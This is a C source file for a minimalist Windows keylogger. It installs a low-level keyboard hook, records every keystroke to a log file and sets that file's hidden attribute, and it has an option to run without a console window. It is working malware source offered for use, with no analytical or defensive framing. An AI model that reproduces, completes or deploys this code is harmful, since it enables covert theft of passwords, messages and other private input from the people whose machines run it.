/*
*
*
*   Minimalist { Windows } KeyLogger
*   (c) Dyrk.org 2019 - 2020
*
*
*/


#include "main.h"
/*
*
*   Main File
*
*
*
**/


// Hook to detect Keyboard Event - Need GetMessage to Work
LRESULT CALLBACK KeyboardProc(int nCode, WPARAM wParam, LPARAM lParam){
    wchar_t title[256];
    PKBDLLHOOKSTRUCT key = (PKBDLLHOOKSTRUCT)lParam;

     switch(wParam){
        case VK_RETURN:
            writeFileString(_KEYLOG_FILENAME_, "\n");
            break;
        case VK_CONTROL:
        case VK_MENU :
        case VK_DELETE:
            break;
        case WM_KEYDOWN :
            // detect if shift is pressed
            bool isShift    = ((GetKeyState(VK_SHIFT) & 0x80) == 0x80 ? true : false);
            // detect if capslock is enabled
            bool isCapslock = (GetKeyState(VK_CAPITAL) != 0 ? true : false);
            // Convert uppercase to lowercase if needed (shift, capsLock)
            if (((isCapslock == false && isShift == false) || (isCapslock == true && isShift == true))  && key->vkCode >=65 && key->vkCode<=90) {
               key->vkCode = key->vkCode + 32;
            }
            appendFile(_KEYLOG_FILENAME_, key->vkCode);
        break;
     }
    return CallNextHookEx(keyboardHook, nCode, wParam, lParam);
}


// Quick way to detect if File exist
bool logFileExist(char *filename){
    struct stat buffer;
    return (stat (filename, &buffer) == 0);
}


// Create Hidden File
void createFile(char *filename, bool hidden){
    FILE *pFile;
    if (logFileExist(filename) == false){
        pFile = fopen(filename, "w");
        fprintf(pFile, "");
        fclose(pFile);
        if (hidden == true){
            DWORD attributes = GetFileAttributes(filename);
            SetFileAttributes(filename, FILE_ATTRIBUTE_HIDDEN);
        }
    }
}


// add character in file
bool appendFile(char *filename, char letter){
    FILE *pFile;
    pFile = fopen(filename, "a+");
    if (pFile != NULL) {
        fprintf(pFile, "%c", letter);
        fclose(pFile);
        return true;
    }
    return false;
}

// add text in file
bool writeFileString(char *filename, char *str){
    FILE *pFile;
    pFile = fopen(filename, "a+");
    if (pFile != NULL) {
        fprintf(pFile, "%s", str);
        fclose(pFile);
        return true;
    }
    return false;
}


int main() {
    MSG msg;
    bool bRet;
    keyboardHook = SetWindowsHookEx(WH_KEYBOARD_LL, KeyboardProc, NULL, 0);
    createFile(_KEYLOG_FILENAME_, true);
    // FreeConsole();
    while ((bRet = GetMessage( &msg, NULL, 0, 0)) != 0){
            TranslateMessage(&msg);
            DispatchMessage(&msg);
    }
}

